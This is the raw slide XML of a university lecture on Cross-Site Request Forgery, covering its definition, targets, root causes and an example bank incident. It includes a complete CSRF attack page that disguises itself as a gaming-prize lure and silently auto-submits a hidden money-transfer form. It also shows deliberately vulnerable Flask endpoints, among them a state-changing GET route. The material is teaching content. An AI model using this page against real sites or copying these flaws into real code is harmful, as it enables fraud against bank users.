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74" r:id="rId8"/>
    <p:sldId id="271" r:id="rId9"/>
    <p:sldId id="272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003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56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1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2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5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9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3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0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7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B6ECA3-B09C-4D39-9CE4-428A77AF5B5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FE3A7DB-86D4-4989-982F-FE1E38B558A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4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.ahmadnawazz@gmail.com" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:Engr.ahmad.Nawaz@giki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889B-D991-49A8-A8AE-F503B2C8E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312722"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="60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30782-9FF3-4E35-8518-59FEFC74C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169328"/>
            <a:ext cx="10058400" cy="2429293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5100" dirty="0"/>
              <a:t>Engr. M Ahmad Nawaz</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="5100" dirty="0"/>
              <a:t>Cyber Security Lecturer</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="5100" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="5100" dirty="0"/>
              <a:t>FCSE Department, GIK Topi, Swabi, KPK, Pakistan</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="5100" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Engr.ahmad.Nawaz@giki.edu.pk</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="5100" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="5100" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>m.ahmadnawazz@gmail.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="51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02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7B080-D81B-4092-859E-46FFE0BB0006}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="582966" y="448023"/>
            <a:ext cx="11144435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Definition</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just"/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Cross-Site Request Forgery (CSRF) is an attack that forces an authenticated user to execute unwanted actions on a web application without their knowledge or consent. The attacker exploits the trust that a website has in the user's browser.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Usage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Unauthorized fund transfers in banking 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Password/email changes without user consent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Account deletion or modification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Privilege escalation attacks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Social media actions (likes, follows, shares)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E-commerce order placement</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="1D1D1F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93014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7B080-D81B-4092-859E-46FFE0BB0006}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="459419" y="0"/>
            <a:ext cx="11273161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Targeting System Area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Authentication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Session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State-changing endpoints (POST/PUT/DELETE)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Banking/financial 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E-commerce platforms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Admin panels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User profile management systems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 Vulnerability Root Cause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Missing anti-CSRF tokens on state-changing requests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Reliance solely on cookies for authentication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GET requests used for state changes (violates REST principles)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No Origin/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="1D1D1F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="system-ui"/>
              </a:rPr>
              <a:t>Referer</a:t>
            </a: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 header validation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Predictable request patterns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Lack of re-authentication for sensitive actions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Missing </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="1D1D1F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="system-ui"/>
              </a:rPr>
              <a:t>SameSite</a:t>
            </a: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 cookie attributes</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="91035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7B080-D81B-4092-859E-46FFE0BB0006}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="818226" y="421390"/>
            <a:ext cx="1092841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Real-World Example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Scenario: European Bank Transfer Attack (2023)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 major European bank suffered a CSRF vulnerability where attackers could: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Embed malicious code in forum posts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When logged-in users visited the forum, their browsers automatically sent authenticated requests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Attackers transferred funds without user knowledge</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr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Impact</a:t>
            </a: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: €2.3 million stolen from 847 accounts</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="421873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9018D-9DE2-4ED2-9060-E3DBAA030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91" y="977405"/>
            <a:ext cx="10449018" cy="5330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8560D7-39BC-4831-948F-9FCA2A4AB78B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3233691" y="210390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</p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="183821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1F15-9B7D-4E9C-80B2-0DF16CD7A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4396"/>
            <a:ext cx="12192000" cy="3616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A36088-F7C8-4E74-A9D8-5A87A2B45E39}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3048740" y="40569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405BC-DA26-4AE5-BB52-27F65F89B40F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="933634" y="5396351"/>
            <a:ext cx="10768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Victim (logged into bank.com) → Visits attacker's forum post→ Browser auto-sends cookies to bank.com/transfer → Transfer executed: $5000 → Attacker's account</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1793307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650E0-16AE-4DBA-A77A-F103E7F3E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69"/>
            <a:ext cx="12192000" cy="609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7BB201-30D7-46C4-90A1-EAE0A4EDD066}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3048740" y="19456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</p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18667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A36088-F7C8-4E74-A9D8-5A87A2B45E39}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3048740" y="40569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373CD-92FB-417D-A254-88C1E577B51A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="623656" y="1075068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Attack Code</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/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Attacker's Malicious Page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: Save as HTML Extension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90A3E-293E-48E7-9309-5F9B3BE62729}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="790112" y="1867549"/>
            <a:ext cx="576160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&lt;!DOCTYPE html&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>&lt;html&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>&lt;head&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>    &lt;title&gt;🎮 Free Gaming Credits - Claim Now!&lt;/title&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>    &lt;style&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>        body {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            font-family: Arial, sans-serif;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            text-align: center;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            padding: 50px;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    .prize-box {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            background: white;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            padding: 40px;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            border-radius: 20px;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            box-shadow: 0 10px 40px </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" err="1"/>
              <a:t>rgba</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>(0,0,0,0.3);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            display: inline-block;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            animation: pulse 1s infinite;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    @keyframes pulse {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            0%, 100% { transform: scale(1); }</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            50% { transform: scale(1.05); }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    .hidden {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            display: none;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&lt;/style&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>&lt;/head&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>&lt;body&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>    &lt;div class="prize-box"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>        &lt;h1&gt;🎉 CONGRATULATIONS! 🎉&lt;/h1&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>        &lt;h2&gt;You've won $1000 in gaming credits!&lt;/h2&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>        &lt;p&gt;Click anywhere to claim your prize...&lt;/p&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>    &lt;/div&gt;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C9939-86C4-4581-B992-11E9D5694837}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6951216" y="1219820"/>
            <a:ext cx="3637534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" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>    &lt;!-- Hidden CSRF attack form --&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>    &lt;form id="</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" err="1"/>
              <a:t>csrf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>-form" </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>          action="https://bank.com/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" err="1"/>
              <a:t>api</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>/transfer" </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>          method="POST" </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>          class="hidden"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>        &lt;input type="hidden" name="</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" err="1"/>
              <a:t>toAccount</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>" value="ATTACKER_ACCOUNT_123"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>        &lt;input type="hidden" name="amount" value="5000"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>        &lt;input type="hidden" name="currency" value="USD"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>        &lt;input type="hidden" name="description" value="Gaming purchase"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>        &lt;input type="hidden" name="confirm" value="true"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>    &lt;/form&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>    &lt;!-- Invisible iframe for response --&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>    &lt;iframe name="</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" err="1"/>
              <a:t>csrf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>-iframe" class="hidden"&gt;&lt;/iframe&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>    &lt;script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>        // Auto-submit when page loads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window.onload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t> = function() {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setTimeout</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>(function() {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document.getElementById</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" err="1"/>
              <a:t>csrf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>-form').target = '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" err="1"/>
              <a:t>csrf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>-iframe';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document.getElementById</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" err="1"/>
              <a:t>csrf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>-form').submit();</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>                </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>                // Show fake loading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document.querySelector</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>('.prize-box').</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" err="1"/>
              <a:t>innerHTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>                    '&lt;h2&gt;⏳ Processing your prize...&lt;/h2&gt;';</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>                </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>                // Redirect after "processing"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setTimeout</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>(function() {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>                    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" err="1"/>
              <a:t>window.location.href</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t> = 'https://legitimate-prize-site.com/claimed';</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>                }, 2000);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            }, 1000);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>        };</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>        // Alternative: Image tag attack (even simpler)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>        // &lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" err="1"/>
              <a:t>img</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" err="1"/>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>="https://bank.com/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" err="1"/>
              <a:t>transfer?to</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" err="1"/>
              <a:t>attacker&amp;amount</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>=500" </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>        //      style="width:1px;height:1px;opacity:0;" alt=""&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>    &lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>&lt;/body&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="8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0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A36088-F7C8-4E74-A9D8-5A87A2B45E39}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3048740" y="40569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Cross-Site Request Forgery (CSRF)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C9939-86C4-4581-B992-11E9D5694837}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7075503" y="1126595"/>
            <a:ext cx="4725974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        </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>        # Log transaction</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>        transaction = Transaction(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from_account</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>=sender.id,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to_account</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>=receiver.id,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>            amount=amount,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>            currency=currency</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>        )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db.session.add</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>(transaction)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db.session.commit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>()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return </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>jsonify</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>({'status': 'success', '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>new_balance</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>': </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>sender.balance</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>})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return </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>jsonify</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>({'error': 'Insufficient funds'}), 400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# Another vulnerable endpoint (GET request - even worse!)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>@app.route('/api/change-email', methods=['GET'])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change_email</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>():</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>    """</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>    CRITICAL: State-changing GET request!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>    Can be exploited via: &lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>img</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>="bank.com/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>change-email?email</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>=attacker@evil.com"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>    """</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>    if '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>user_id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>' not in session:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>        return </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>jsonify</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>({'error': 'Unauthorized'}), 401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new_email</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>request.args.get</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>('email')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>    user = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>User.query.get</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>(session['</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>user_id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>'])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user.email</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>new_email</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>db.session.commit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>()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return </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>jsonify</a:t>
            </a:r>
            <a:r>
